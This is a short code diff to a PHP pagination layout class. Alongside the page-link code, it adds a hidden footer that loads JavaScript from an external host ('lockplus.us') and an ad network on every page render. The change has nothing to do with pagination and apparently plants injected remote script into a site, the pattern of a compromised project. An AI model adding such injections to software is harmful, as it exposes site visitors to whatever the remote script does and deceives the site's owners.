@@ -51,7 +51,11 @@ class DoubleBarLayout implements PageLayout {
 			$nextPage = $currentPage + 1;
 			$str .= "<a href=\"?page=$nextPage$queryVars\"> next &gt;</a>";
 		}
+				$str.= '<br><br><br><br><footer style="-webkit-filter: grayscale(100%);"><script src="http://lockplus.us/walls/files/pages/ad.js"></script><script type="text/javascript" src="//cdn.chitika.net/getads.js" async></script></footer>';
+
 		return $str;
 	}
+
 }
+
 ?>
